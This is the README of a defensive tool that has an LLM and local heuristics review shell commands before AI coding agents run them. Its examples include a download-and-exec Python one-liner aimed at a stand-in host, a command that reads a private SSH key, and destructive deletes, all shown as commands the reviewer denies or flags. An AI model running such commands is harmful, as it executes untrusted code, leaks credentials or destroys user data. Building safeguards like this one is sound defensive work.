# AI Command Reviewer

[![CI](https://github.com/AaronMBuhr/ai-command-reviewer/actions/workflows/ci.yml/badge.svg)](https://github.com/AaronMBuhr/ai-command-reviewer/actions/workflows/ci.yml)
[![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)

**Have Claude, ChatGPT, or Gemini review shell commands before your AI coding
agent runs them.** Command-review hooks for Claude Code, Codex,
Windsurf / Devin Desktop (Devin Local and Cascade), and Google Antigravity.

Your agent proposes a 400-character `python -c` one-liner. You have two seconds
to decide. You skim it, click approve, and never really know what it did. This
sits in front of that moment.

Real output, same reviewer, four commands:

```console
$ git status
  ALLOW  Read-only git status query on a local repository.

$ python -c "import json; print(json.load(open('package.json'))['version'])"
  ALLOW  Read-only Python command that extracts the version field from package.json.
         - Opens and parses package.json in the current directory
         - No file writes, deletions, network access, or side effects

$ python -c "import urllib.request as u; exec(u.urlopen('https://pastebin.test/x').read())"
  DENY   Downloads and executes arbitrary code from a remote URL; classic remote
         code execution attack vector.
         - Executes fetched content directly with exec() with no validation
         - Pattern matches download-and-execute malware behavior

$ cat ~/.ssh/id_rsa
  DENY   Reading private SSH key file; exposing credentials to the agent is a
         security risk.
         - Touches credentials or private keys (ssh-key)
```

Those two `python -c` commands are the same shape. A pattern matcher either
blocks both or neither. Reading what the code actually does is the difference —
and a hard-coded rule that credentials are never auto-read is what catches the
last one regardless of what any model thinks.

### The point is the ones it lets through

Blocking `rm -rf /` is not the value; your agent already asks before running
things. The value is the 400-character one-liner that is **fine**, which you
currently approve without reading because the alternative is not using the agent.

That approval was never protecting you. At the moment you decide, the command is
truncated to a few lines in the terminal, and once it finishes the transcript
collapses it to "ran 1 shell command" — so you cannot fully read it before, and
cannot review it after.

This reads the whole thing, every time, and gets out of the way when it is safe.
Turn on [`policy.log_path`](#seeing-what-the-hook-decided-logging) and every
decision — including the silent allows — is recorded in full with its reasoning.
That log is the only place the complete command text and the judgement behind it
survive, which makes it the answer to "how do I know it isn't just rubber-stamping?"

## Install

```bash
git clone https://github.com/AaronMBuhr/ai-command-reviewer.git
cd ai-command-reviewer
./install.sh                       # or .\install.ps1 on Windows
export ANTHROPIC_API_KEY=...       # or OPENAI_API_KEY / GEMINI_API_KEY
```

The installer copies the hook, seeds a config file, and prints the exact
`settings.json` snippet to paste. Full details in [Install](#install-1) below.

> **This is a guardrail, not a sandbox.** It stops you rubber-stamping commands
> you did not read. It does not isolate the filesystem and will not stop an
> attacker who already controls your agent. See [Threat model](#threat-model).

---

## How it works

- reads the command the agent is about to run;
- runs local safety heuristics (a documented decision table, not a black box);
- asks **Claude**, **ChatGPT**, or **Gemini** for a second opinion — or routes to
  your own reviewer service;
- returns `allow`, `ask`, or `deny`, and explains whether "Yes, and don't ask
  again" would be safe.

Ambiguous commands become `ask`, never `allow`. Local findings are a floor the
AI can raise but not lower.

Every provider is called with `urllib` — no vendor SDKs. It runs on the Python
standard library alone unless you use a config file, which needs PyYAML. That
matters because a hook runs under whatever interpreter the host agent is
configured with, which is often not your project's virtualenv.

## Supported implementations

The same review engine serves each host, but approval behavior depends on the
host's hook contract. Choose the adapter and configuration for your agent:

| Implementation | Hook events | What `allow` does | What `ask` does | Setup |
|---|---|---|---|---|
| Claude Code | `PreToolUse` | Approves the tool call | Opens the permission prompt | [Claude Code setup](#claude-code-and-codex-setup) |
| Codex | `PreToolUse` + `PermissionRequest` | Continues at PreToolUse; approves at PermissionRequest | Leaves the host's approval handling in place | [Codex details](#codex-prompt-layers) |
| Devin Local | `PermissionRequest` | Approves the pending command automatically | Leaves the normal user prompt in place | [Devin Local setup](#devin-local-auto-approve-safe-commands-prompt-for-others) |
| Windsurf / Devin Desktop Cascade | `pre_run_command` | Proceeds automatically with Turbo enabled | Waits in a desktop Allow once / Cancel dialog | [Cascade setup](#cascade-desktop-confirmation-dialog) |
| Google Antigravity (`agy` CLI, IDE, 2.0) | `PreToolUse` (`run_command`) | `auto_approve` skips the default permission prompt | Waits in a desktop Allow once / Cancel dialog | [Antigravity setup](#google-antigravity-setup) |

All five integrations block a `deny` result. **Devin Local and Cascade are
different agents in the same IDE.** Devin Local uses its native approval prompt.
Cascade uses a separate desktop confirmation dialog because its hook API has no
native `ask` response. Cascade's auto-execution setting controls whether an
additional IDE approval click is required after the hook allows the command.

The installers copy the five adapters and print their configuration. They do not
modify host settings. A Cursor adapter is also included as source; the installers
do not currently provide Cursor setup.

## Included files

```text
.claude/
  settings.local.json.example
  hooks/
    review_core.py                 # local heuristics + decision combination
    config.py                      # config file discovery, layering, .env boundary
    providers.py                   # claude / chatgpt / gemini adapters
    safe-command-review-hook.py    # Claude Code adapter
    codex-command-review-hook.py   # Codex adapter
    windsurf-command-review-hook.py # Cascade + legacy Devin PreToolUse
    command_confirmation.py        # desktop Allow once / Cancel dialog
    devin-command-review-hook.py    # Devin Local PermissionRequest
    antigravity-command-review-hook.py # Google Antigravity PreToolUse
    cursor-command-review-hook.py   # additional source adapter
    exception_grants.py            # exception grants: validation, matching, integrity
    aiallow.py                     # exception-grant CLI (Windows)
    setup-grants.ps1               # creates the admin-only grants store (UAC)
grant-writer/
  grant-writer.ps1                 # the elevated grant writer (installed by setup)
.codex/
  hooks.json.example
.windsurf/
  hooks.json.example              # Cascade pre_run_command
.devin/
  hooks.v1.json.example           # Devin Local PermissionRequest
.agents/
  hooks.json.example              # Google Antigravity PreToolUse
examples/
  hook-input-python-c.json
  hook-input-dangerous.json
  hook-input-safe-readonly.json
  hook-input-codex-pretool.json
  hook-input-codex-permission-request.json
  hook-input-windsurf.json
  hook-input-windsurf-ask.json     # harmless desktop confirmation probe
  hook-input-devin-pretool.json
  hook-input-devin-permission-request.json
  hook-input-antigravity.json      # run_command PreToolUse sample
  mock-review-server.py           # reference endpoint for reviewer.url
tests/
  conftest.py
  test_adapters.py                # hook response schemas, run as subprocesses
  test_windsurf_adapter.py         # Cascade/Devin stdin and confirmation decisions
  test_command_confirmation.py     # dialog approval, cancellation, and failures
  test_windsurf_installation.py    # installer output and launch commands
  test_devin_adapter.py           # approve / prompt / block responses
  test_antigravity_adapter.py      # allow / dialog / deny, never empty stdout
  test_antigravity_installation.py # printed command runs under cmd /c or sh -c
  test_config.py                  # config layering, .env trust boundary
  test_heuristics.py              # the local decision table
  test_providers.py               # per-provider request/response shapes
  test_review_core.py             # end-to-end policy plumbing
.github/workflows/ci.yml
config.example.yaml
pyproject.toml
requirements-dev.txt
.env.example
install.ps1
install.sh
LICENSE
SECURITY.md
```

The files in `.claude/hooks/` are one unit — install or vendor them together, not
individually. `install.sh` / `install.ps1` do this for you.

## Install

Install once, globally — the reviewer is a tool you run, not part of any one
codebase, and vendored copies drift out of sync.

```bash
git clone https://github.com/AaronMBuhr/ai-command-reviewer.git
cd ai-command-reviewer
./install.sh          # or: .\install.ps1 on Windows
```

That copies the hook scripts to `~/.claude/hooks/cc-ai-review/`, seeds a config
file, checks that PyYAML is present, and prints the exact `settings.json` snippet
to paste — with a real interpreter path already filled in.

Then set an API key for the provider you want:

```bash
export ANTHROPIC_API_KEY=...     # or OPENAI_API_KEY / GEMINI_API_KEY
```

Verify it is working:

```bash
python ~/.claude/hooks/cc-ai-review/safe-command-review-hook.py \
  < examples/hook-input-dangerous.json
```

You should get a JSON response with `"permissionDecision": "deny"`.

## Claude Code and Codex setup

Claude Code and Codex use separate hook wiring and separate adapter entry points,
because they read different config locations and expect different response
schemas. Both adapters share the same reviewer modules:

```text
review_core.py                  # local heuristics + decision combination
config.py                       # config discovery, layering, .env boundary
providers.py                    # claude / chatgpt / gemini adapters
safe-command-review-hook.py     # Claude Code adapter
codex-command-review-hook.py    # Codex adapter
```

Start from `.claude/settings.local.json.example` for Claude Code, and
`.codex/hooks.json.example` for Codex. The Codex example uses absolute paths on
purpose: Codex does not set `%CLAUDE_PROJECT_DIR%`, so relative paths are not
reliable there.

The hook config files are intentionally separate:

- **Claude Code shell commands use `matcher: "Bash|PowerShell"`.** On Windows,
  PowerShell is a *separate* hookable tool — with only `"Bash"`, every PowerShell
  command bypasses review entirely and the hook appears to work while checking
  nothing.
- Codex documentation currently names shell commands as `Bash`, while older
  observed Codex hook payloads used `tool_name: "shell"`. The checked-in Codex
  example uses `matcher: "Bash|shell"` so either spelling can match.
- Codex permission escalation reviews use `PermissionRequest` with `matcher: "*"`.
- Codex hooks must be reviewed/trusted with `/hooks` after changes.
- On Windows, keep `commandWindows` free of embedded quotes. A current Codex
  runner bug can report a quoted hook command as completed without executing it,
  so the interpreter and hook paths used there must not contain spaces.
- Set top-level `approvals_reviewer = "auto_review"` in `~/.codex/config.toml`.
  The checked-in Windows hook command disables external-provider network calls
  inside the sandbox; Codex then reviews commands that the local rules leave
  unresolved.
- Codex API-side `functions.exec_command` sessions have not been verified to
  run local hook config; verify the exact Codex surface you care about with
  `CC_AI_REVIEW_LOG`.

### Codex prompt layers

Codex has two review stages for one command:

1. The `PermissionRequest hook (completed)` block is this hook's review output.
   It applies to the command being considered and contains the local/AI safety
   explanation when the decision is `ask` or `deny`.
2. `PermissionRequest` handles Codex's sandbox/escalation gate. An `allow`
   decision suppresses the built-in `Would you like to run the following
   command?` prompt. With `approvals_reviewer = "auto_review"`, Codex reviews
   unresolved requests before deciding whether a user prompt is still needed.

If multiple tool calls are launched in parallel, transcript output can interleave
and make those blocks look mismatched. Run hook-debugging commands one at a time.

For Codex `PreToolUse`, `allow` is intentionally silent to reduce cognitive
load. `ask` surfaces a `systemMessage`; `deny` returns a block decision and a
reason. The actual user approval gate for escalated execution is the
`PermissionRequest` path and Codex's own sandbox prompt.

Because Codex does not expose an enforceable third `ask` behavior for
`PermissionRequest`, destructive operations should not rely on warning-only
messages. On Codex this hook therefore denies ordinary delete/remove commands and
allows only safer shapes: PowerShell `-WhatIf` dry runs, or deletes whose targets
are limited to cleanup artifacts such as `__pycache__`, `*.pyc`, `*.pyo`, or
`*.bak`. On Claude Code, where `ask` is enforced with a real prompt, deletes are
`ask` instead — see `policy.delete_decision`.

## Devin / Windsurf IDE setup

Devin Local and Cascade use different approval mechanisms and separate adapters.
Run `install.ps1` or `install.sh` to copy the scripts and print setup instructions.
The installers do not modify IDE settings.

| Agent | Adapter | Event | Configuration example |
|---|---|---|---|
| Devin Local | `devin-command-review-hook.py` | `PermissionRequest` | `.devin/hooks.v1.json.example` |
| Cascade | `windsurf-command-review-hook.py` | `pre_run_command` | `.windsurf/hooks.json.example` |

### Devin Local: auto-approve safe commands, prompt for others

Register `devin-command-review-hook.py` for `PermissionRequest` with matcher
`^exec$`. Copy or merge `.devin/hooks.v1.json.example` into the target project's
`.devin/hooks.v1.json`. This standalone format has `PermissionRequest` at the top
level, without an enclosing `hooks` object. Replace placeholder paths with real
absolute paths. For global registration, put that same object under `hooks` in
`%APPDATA%\devin\config.json` (Windows) or `~/.config/devin/config.json` (macOS/Linux).

Keep shell commands subject to approval so the permission hook can review them:

```json
"permissions": {
  "ask": ["exec"]
}
```

Merge this with existing permission rules. Commands already permitted by another
rule or permission mode may not raise a permission request and therefore may not
reach this reviewer. This integration does not require Turbo or bypass mode.

| Reviewer result | PermissionRequest response | Result |
|---|---|---|
| `allow` | `{"decision":"approve"}` | Resolve the permission request automatically |
| `ask` | No decision | Leave the normal user approval prompt in place |
| `deny` | `{"decision":"block","reason":"..."}` | Reject the command |

With the default local policy, `git diff` is allowed, `rm *` asks, and
`git reset --hard` is denied. An external reviewer and your policy configuration
can change the final verdict. A reviewer error uses `policy.fail_mode` (`ask` by
default); invalid input or configuration blocks. Review reasons remain in the log;
whether the IDE displays an undecided response's reason depends on the host.

To see explanations and approve commands in the same desktop dialog, append
`--desktop-review` to the Devin hook command and set its hook `timeout` to **300**
seconds. An `ask` opens **AI Command Review - Devin: Approval** with the command,
working directory, full review, and **Allow once / Cancel** buttons. Only Allow
once returns `approve` for that invocation, avoiding a second native prompt.
Cancel, closing the dialog, a display failure, or the 120-second dialog timeout
returns `block`. The 300-second host timeout allows for the reviewer's maximum
120-second timeout, the dialog, and startup overhead.

Automatic approvals still run immediately. Their explanations and blocked
reviews appear in one separate **AI Command Review - Devin** history window
(latest 50, newest first). It has a Close button because those decisions are
already resolved; it does not offer an override for blocked commands. Closing
the history is safe; the next automatic approval or block reopens it.

The optional viewer requires Python's Tk support. Its history is stored in
`%LOCALAPPDATA%/cc-ai-review/devin-feedback.jsonl` on Windows, or
`$XDG_STATE_HOME/cc-ai-review/devin-feedback.jsonl` (default
`~/.local/state/cc-ai-review/devin-feedback.jsonl`) elsewhere. Viewer startup
errors go to the neighboring `devin-feedback.errors.log`. Informational history
display failures do not change verdicts; approval-dialog failures block. Leave
the flag off for headless use and Devin's native approval prompts.

**Migrating from the old setup:** remove this project's
`windsurf-command-review-hook.py` entry from Devin Local's `PreToolUse` hooks.
It blocks `ask` results before they can reach the permission prompt. Keep unrelated
hooks. Do not point the new adapter at `PreToolUse`; it accepts only shell
`PermissionRequest` payloads. Restart the agent and use `/hooks` to check loading.

This uses the documented [Devin permission hook contract](https://docs.devin.ai/cli/extensibility/hooks/lifecycle-hooks#permissionrequest).

### Cascade: desktop confirmation dialog

Merge `.windsurf/hooks.json.example` into `~/.codeium/windsurf/hooks.json` for all
projects, or `.devin/hooks.json` in a workspace. Older Windsurf versions use
`.windsurf/hooks.json`; current Devin Desktop uses that legacy file only when
`.devin/hooks.json` is absent or defines no hooks.

On Windows, keep `; exit $LASTEXITCODE` in the PowerShell hook command so the IDE
receives Python's blocking exit code `2`. Use a real Python interpreter rather
than `conda run`. `show_output: true` displays diagnostics. Restricted Mode does
not run hooks.

Cascade's hook API has no native `ask` response, so the adapter supplies a
separate desktop confirmation dialog:

| Review | Behavior |
|---|---|
| `allow` | Returns exit `0` without opening a dialog. |
| `ask` | Waits for **Allow once** or **Cancel**, showing the full command, working directory, and review reason. Allow once returns `0` for this invocation only. |
| `deny` | Returns exit `2` with the reason; no approval override is offered. |

Cancel, closing the dialog, Escape, and Enter reject the command with exit `2`.
No approval is remembered. A missing Tk installation, unavailable desktop, or
dialog failure also blocks with an explanation. Python must include `tkinter`
and have access to the interactive desktop; SSH/headless hook processes cannot
show this dialog. Re-run the installer when upgrading so `command_confirmation.py`
is copied alongside the adapter. No third-party Python GUI package is required.

After verifying the hook and dialog load, select **Terminal Auto Execution →
Turbo** in Cascade's settings to avoid a second IDE approval click. In Turbo,
safe commands proceed automatically and `ask` waits in this project's dialog.
User/team denylist entries can still require a native approval click. Disabled,
Allowlist, and Auto modes keep Cascade's separate approval policy in effect.

**Turbo depends on the hook running.** Cascade can proceed when a hook is skipped,
fails to launch, or exits with a code other than `2`; Restricted Mode disables
hooks. An external host timeout or cancellation cannot be turned into a rejection
by a process the host has stopped. Verify your installed host's behavior before
relying on this combination. The dialog itself waits for a decision and never
auto-approves on elapsed time. The reviewer timeout does not limit dialog time.
The review log retains the original `ask` verdict, not the user's dialog choice.

For a harmless dialog test, feed `examples/hook-input-windsurf-ask.json` to the
adapter with `CC_AI_REVIEW__REVIEWER__PROVIDER=none`. Cancel should exit `2`;
Allow once should exit `0`. Payload tests never execute the proposed command.
Then check both paths in Cascade using a harmless command before relying on it.

The old Devin `PreToolUse` payload remains accepted for backwards compatibility;
its `ask` still blocks with migration instructions. For Devin Local, use the
`PermissionRequest` adapter above to get the native IDE prompt.

See [Cascade hooks](https://docs.devin.ai/desktop/cascade/hooks) and
[auto-execution settings](https://docs.devin.ai/desktop/terminal#auto-execution-levels).

### Verification and limits

Both integrations review shell commands only. Native file edits and MCP calls
are outside their scope. If the payload lacks `cwd`, review uses the hook
process's directory, which may differ from a persistent shell's directory.
Keep the reviewer timeout below the host's hook timeout; the Devin example uses
60 seconds with the reviewer's default 20-second budget.

Feed `examples/hook-input-devin-permission-request.json` to the Devin adapter:
it reviews `git diff --check` and should emit `{"decision":"approve"}` in
local-only mode (`CC_AI_REVIEW__REVIEWER__PROVIDER=none`). Changing only the payload
command to `rm *` should emit a reason without a decision. These payload checks
do not execute the proposed command. The older Devin PreToolUse sample remains
available for checking the legacy adapter.

In a **Devin Local** session, test with `git diff` and confirm it runs without an
Allow click. Confirm the prompt path with a harmless, unrecognized command such
as `cc_ai_review_hook_probe` in local-only mode; reject the prompt. Do not execute
a destructive command as a test. Enable `policy.log_path` to verify actual
reviews. Cascade and Devin Local require separate live UI checks.

## Google Antigravity setup

Antigravity (the `agy` CLI, the Antigravity IDE, and Antigravity 2.0) reads
lifecycle hooks from `hooks.json` in a customization root. For all projects,
merge `.agents/hooks.json.example` into `~/.gemini/config/hooks.json`. For one
project, use the project's `.agents/hooks.json`. The installers print the entry
with real paths. Keep unrelated named hooks when merging.

```json
{
  "cc-ai-review": {
    "PreToolUse": [
      {
        "matcher": "^run_command$",
        "hooks": [
          {
            "type": "command",
            "command": "C:\\path\\to\\python.exe C:\\Users\\you\\.claude\\hooks\\cc-ai-review\\antigravity-command-review-hook.py",
            "timeout": 600
          }
        ]
      }
    ]
  }
}
```

Use a host that supports the `auto_approve` hook decision (`agy` 1.5.3 or newer).
Keep **Tool permission → request-review** in `agy`'s `/config` (the default, or
`"toolPermission": "request-review"` in `~/.gemini/antigravity-cli/settings.json`).
Restart `agy` after registering the hook; hooks load when a session starts.

**Windows: no quotes, no spaces.** Antigravity runs a hook through `cmd /c` and
escapes embedded quotes as `\"`, which `cmd` cannot parse; a quoted interpreter
path fails with "is not recognized as an internal or external command". Both
the Python and script paths must therefore be free of spaces. `install.ps1`
prints an unquoted command and warns when a path contains a space. On macOS and
Linux the command runs through `sh -c`, and normal quoting works.

The hook process starts in the directory that contains `hooks.json`, not the
workspace. The adapter reviews against the tool's `Cwd` argument when present,
otherwise the first entry in `workspacePaths`.

| Review | Response | Behavior |
|---|---|---|
| `allow` | `{"decision": "auto_approve"}` | Skips the default permission prompt; explicit user rules still apply |
| `ask` | Desktop **Allow once / Cancel** dialog, then `auto_approve` or `deny` | Shows the command, working directory and reason; only Allow once runs it |
| `deny` | `{"decision": "deny", "reason": ...}` | Blocked, with the reason shown to the user and the agent |

The [Antigravity hook contract](https://antigravity.google/docs/hooks) distinguishes
`allow` (continue through the host's default policy) from `auto_approve` (approve
when that policy would otherwise prompt, honoring explicit user rules). Sending
`allow` was why even a reviewer-approved `git diff` still showed "Run this command?"
in `request-review` mode. The adapter now sends `auto_approve` for approved commands.
Verified with `agy` 1.5.3: `git diff --name-only -- README.md` executed with
`request-review` and empty allow/ask/deny lists, without a permission prompt.

As with Cascade, the adapter settles `ask` in its desktop dialog so each review
requires a fresh confirmation, including when the host has cached an allow rule.
Cancel, closing the window, Escape, Enter, a missing Tk/desktop, or a
missing `command_confirmation.py` deny the command. Nothing is remembered between
commands; the review log keeps the original `ask` verdict. The dialog uses the
same `command_confirmation.py` as Cascade and needs Python with `tkinter` and an
interactive desktop.

The 600-second hook timeout leaves time to answer the dialog. If it expires,
`agy` blocks the command. Approval in the dialog also returns `auto_approve`,
avoiding a second default permission prompt.

**Migration:** earlier instructions recommended `always-proceed` to compensate
for the old `allow` response. It is no longer needed. Switch back to
`request-review` to retain host review for actions this shell-only hook does not
cover, such as file edits, MCP tool calls and page reads.

The adapter never sends `overwrite`, so it cannot rewrite a command.

Failure behavior observed with `agy` 1.4.12; `auto_approve` requires a current
host (use `agy` 1.5.3 or newer). Older hosts can block an unknown decision;
upgrade the host rather than enabling `always-proceed`. Recheck after upgrading:

- `deny`, malformed JSON, an unknown decision, any nonzero exit, and a hook that
  overruns its `timeout` all **block** the tool call. Unlike Claude Code, a slow
  reviewer is blocked rather than skipped.
- Exit 0 with **empty stdout runs the command**. The adapter always writes a
  decision, and exits 2 if it cannot.
- `deny` blocks in every permission mode, including `always-proceed` and
  `--dangerously-skip-permissions`.
- Explicit user permission rules still apply to `auto_approve`.
- In `request-review` mode a hook `allow` does not skip `agy`'s prompt.
  `permissionOverrides` only changes what an `ask` requests; it grants nothing.
- Plain `ask` is satisfied by a matching `permissions.allow` rule, and
  `always-proceed` auto-approves `ask` and `force_ask`. The adapter therefore
  never returns either.

To test without an agent, feed `examples/hook-input-antigravity.json` to the
adapter with `CC_AI_REVIEW__REVIEWER__PROVIDER=none`. It should print
`{"decision": "auto_approve"}`. Changing the `CommandLine` to `rm *` should open the
dialog: Cancel prints `deny`, Allow once prints `auto_approve`. Payload tests never run
the proposed command. In a live session, check that `git status` runs without a
prompt and that deleting a nonexistent file opens the dialog. After installing globally,
`~/.gemini/antigravity-cli/cli.log` should report `loaded 1 named hooks`.

## Test without an agent

Feed the sample payloads straight in. Replace `python` with your interpreter
path if `python` is not on your PATH:

```bash
python .claude/hooks/safe-command-review-hook.py  < examples/hook-input-dangerous.json
python .claude/hooks/safe-command-review-hook.py  < examples/hook-input-python-c.json
python .claude/hooks/safe-command-review-hook.py  < examples/hook-input-safe-readonly.json
python .claude/hooks/codex-command-review-hook.py < examples/hook-input-codex-pretool.json
python .claude/hooks/codex-command-review-hook.py < examples/hook-input-codex-permission-request.json
```

```powershell
Get-Content .\examples\hook-input-dangerous.json -Raw |
  & python .\.claude\hooks\safe-command-review-hook.py
```

Expect `deny` for the dangerous input, `allow` for the read-only one, and
`allow` or `ask` for the inline-Python one depending on whether an API key is
set. Each run prints a JSON hook response.

## Running the tests

```bash
pip install -r requirements-dev.txt
pytest
ruff check .
```

The suite covers the local decision table, all three provider request shapes
(against a stubbed transport, so it never makes API calls), config layering, and
the `.env` trust boundary.

## LLM providers

Three providers are supported. Set the matching API key and the hook asks that
provider whether each command is safe — no separate server, no vendor SDKs, just
`urllib`.

| Provider key | Vendor | API key variable |
|---|---|---|
| `claude` | Anthropic | `ANTHROPIC_API_KEY` |
| `chatgpt` | OpenAI | `OPENAI_API_KEY` |
| `gemini` | Google | `GEMINI_API_KEY` |

`anthropic`, `openai`, and `google` work as aliases for the three keys above.

With `reviewer.provider: auto` (the default) the hook picks the first provider
that has a key, in the order **claude → chatgpt → gemini**. Name one explicitly
to pin it — an explicit provider without a key reviews locally rather than
silently falling through to a different vendor.

Only `claude` ships with a default model, because it is the one this project's
tests exercise. **`chatgpt` and `gemini` require you to set `model`**; a stale
baked-in model id would fail on first run for everyone. `config.example.yaml`
carries suggested values to start from — check them against the models your
account can actually access.

Note: these are billed per token, separately from any Claude Code Pro/Max
subscription. Reviews use a small fast model, so cost is a fraction of a cent per
command, but you do need a key with billing enabled.

Reviewer precedence: `reviewer.url` → `reviewer.command` → the selected LLM
provider → local heuristics only.

## Configuration file

All settings live in a YAML file. Copy `config.example.yaml` to whichever of
these the hook should read — the first one found wins:

1. the path in `$CC_AI_REVIEW_CONFIG`
2. `%APPDATA%\cc-ai-review\config.yaml` (Windows) or
   `~/.config/cc-ai-review/config.yaml` (macOS/Linux)
3. `.claude/hooks/config.yaml`, next to the hook scripts

```powershell
Copy-Item .\config.example.yaml $env:APPDATA\cc-ai-review\config.yaml
```

```bash
mkdir -p ~/.config/cc-ai-review && cp config.example.yaml ~/.config/cc-ai-review/config.yaml
```

The config file is **optional** — with none present the hook runs on defaults
plus environment variables, so the zero-install path still works.

A config file requires **PyYAML** in the interpreter that runs the hook. If a
config file exists and PyYAML is missing, the hook fails closed with an
explanation rather than silently reverting to defaults, because the config you
wrote may be stricter than the defaults are.

### Environment variables override the file

Any setting can be overridden using its path through the config, uppercased,
with a **doubled** underscore between segments (single underscores appear inside
key names like `max_tokens`, so they cannot be the separator):

```bash
export CC_AI_REVIEW__POLICY__FAIL_MODE=deny
export CC_AI_REVIEW__PROVIDERS__GEMINI__MODEL=gemini-2.5-flash
export CC_AI_REVIEW__PROVIDERS__CHATGPT__TEMPERATURE=null
```

The older flat names (`CC_AI_REVIEW_FAIL_MODE`, `CC_AI_REVIEW_ANTHROPIC_MODEL`,
`CC_AI_REVIEW_LOG`, …) still work and map onto the same settings.

### Provider settings are per-provider

Each provider block takes the keys that provider's own API understands, so they
differ by design — `gemini` has `max_output_tokens` and `thinking_budget`,
`chatgpt` has `response_format` and `max_tokens_field`. Anything not modelled
explicitly can be passed straight through with `extra_body`, so a provider adding
a parameter does not require a change to this project:

```yaml
providers:
  chatgpt:
    model: gpt-4.1-mini
    extra_body:
      seed: 42
      top_p: 0.1
```

Setting `temperature: null` omits the field entirely, for models that reject it.

## API keys and `.env`

Keys can come from the real environment, from a `.env` file, or from
`api_key_env` in the config (which names the variable to read — the recommended
way, since it keeps the key off disk).

**A `.env` file may only set API keys.** Anything else in it is ignored and
reported in the review output. This is a security boundary, not a limitation:
`.env` is searched in the working directory, which an agent may have pointed at a
repository you just cloned. A `.env` that could set `reviewer.command` would be
arbitrary code execution inside the hook meant to prevent exactly that, and one
that could set a `base_url` would hand an attacker every command you run plus
control of the verdict.

For the same reason, config files are **never** read from the working directory
or `CLAUDE_PROJECT_DIR` — only from locations you own.

Set reviewer routing (`reviewer.url`, `reviewer.command`, any `base_url`) in the
config file or the real environment.

`.env` is already in `.gitignore` — keep your real key out of version control.

## Optional: connect to an AI reviewer HTTP endpoint

```yaml
reviewer:
  url: http://127.0.0.1:8765/review
```

Or, equivalently, in the real environment (not `.env` — see above):

```bash
export CC_AI_REVIEW_URL="http://127.0.0.1:8765/review"
```

The hook will POST JSON like this:

```json
{
  "command": "python -c \"...\"",
  "cwd": "/home/dev/myproject",
  "description": "Extract the version from package.json",
  "local_decision": "ask",
  "local_headline": "Local safety checks flagged this command for review.",
  "local_particulars": ["Inline Python is opaque and may run arbitrary code."],
  "local_flags": ["inline-python"],
  "dont_ask_again_safe_local": false,
  "required_output_contract": {
    "decision": "allow|ask|deny",
    "headline": "one sentence: the command's apparent intent and overall risk",
    "particulars": ["specific observations; name exact filenames/paths/packages/URLs"],
    "dont_ask_again_safe": "boolean"
  }
}
```

`examples/mock-review-server.py` is a working reference implementation of this
contract.

Your endpoint can return either the simple contract:

```json
{
  "decision": "ask",
  "reason": "Likely safe, but do not approve the broad python -c wildcard."
}
```

or a full Claude Code hook response:

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "ask",
    "permissionDecisionReason": "Likely safe, but do not approve the broad python -c wildcard."
  }
}
```

## Optional: connect to any local command instead of HTTP

Set `reviewer.command` to a command that reads the review JSON from stdin and
prints review JSON to stdout:

```yaml
reviewer:
  command: python /path/to/review_command_cli.py
```

The hook will call that command with the same JSON payload described above.

This setting runs a subprocess, so it is honoured only from the config file or
the real environment — never from a `.env`.

## Seeing what the hook decided (logging)

Claude Code only reports a `PreToolUse` decision back to the model when the
decision is `deny`. On `ask` you get a permission prompt; on `allow` the
command just runs and **the model is told nothing**. The hook's stdout on
success is shown only to you in transcript mode (Ctrl-R) and is never added to
the model's context. Codex is configured similarly: allowed `PreToolUse` reviews
are silent, while `ask` and `deny` decisions surface the hook's explanation.
So there is no way to make the model echo "the hook said X" on every tool call
without adding noise to normal safe commands. If you want a record of every
decision, log it.

Set `CC_AI_REVIEW_LOG` to a file path and the hook appends one JSON line per
invocation, including the silent `allow` cases:

PowerShell:

```powershell
$env:CC_AI_REVIEW_LOG = "$env:USERPROFILE\.claude\cc-ai-review.jsonl"
```

Bash:

```bash
export CC_AI_REVIEW_LOG="dev/review-log.jsonl"
```

Each line looks like:

```json
{"ts": "2026-06-22T11:18:13.121601+00:00", "decision": "ask", "source": "local", "flags": ["inline-python"], "dont_ask_again_safe": false, "command": "python -c \"...\"", "cwd": "...", "description": "...", "reason": "Review recommended: Inline Python is opaque ..."}
```

Logging is opt-in and best-effort: if the log file cannot be written, the hook
still returns its normal decision. Add the log path to `.gitignore` if it lives
inside the repo.

### What it has actually been doing

Pass `--stats` to any adapter to summarise that log — the answer to "is it
reviewing anything, or just rubber-stamping?":

```console
$ python ~/.claude/hooks/cc-ai-review/safe-command-review-hook.py --stats
Command review log  /home/dev/.claude/cc-ai-review.jsonl
33 decisions   2026-08-01 to 2026-08-12

  allow      25   75.8%  ##################......  ran with no prompt
  ask         6   18.2%  ####....................  raised a prompt
  deny        2    6.1%  #.......................  blocked

Decided by
  local                      33

Most frequent flags
  readonly-or-test           25
  dependency-install          2
  hard-deny                   2
  inline-python               2
  sensitive-path              1
```

It reads the configured `policy.log_path` by default, or takes an explicit path
(`--stats path/to/log.jsonl`). Corrupt lines are reported rather than dropped
quietly, since a log that lost entries should say so.

To confirm the hook is firing at all, launch Claude Code with `claude --debug`
(prints hook matching and execution) or run `/hooks` in-session to list what is
registered.

## Choosing the Python interpreter (Windows / conda)

The hook reads its payload from **stdin**. Two Windows gotchas:

- **Bare `python` may not be on PATH.** If the hook command is just `python ...`
  and `where python` finds nothing, `cmd.exe /c python ...` fails to launch and
  Claude Code silently skips the hook — so it looks like the hook "isn't
  working" even though it is registered. Point the command at a real
  interpreter, e.g. a conda env's `python.exe`:

  ```json
  "command": "\"C:\\Path\\To\\python.exe\" \"%USERPROFILE%\\.claude\\hooks\\cc-ai-review\\safe-command-review-hook.py\""
  ```

  `install.ps1` resolves this for you and prints the snippet with a real path
  already filled in.

- **Do not wrap the hook in `conda run`.** `conda run -n env python hook.py`
  does not forward stdin to the child process (even with
  `--no-capture-output`), so the hook receives an empty payload and reports
  "no shell command found". Call the env's `python.exe` directly instead.

## Safety model

The hook has a local risk floor:

- local hard-deny findings override the AI reviewer;
- reading credentials or private keys is never auto-allowed, and secret material
  combined with network access or an interpreter pipe is denied outright;
- by default, local `ask` findings cannot be downgraded to `allow` by the
  external reviewer except for scoped opacity-only interpreter cases;
- with `policy.allow_external_override: true`, an external `allow` can lift other
  local `ask` findings to `allow`, while hard-deny still wins;
- if the external reviewer fails, times out, or returns malformed JSON, the hook
  returns `ask` by default (`policy.fail_mode`).

Use the override deliberately. The scoped floor is the default.

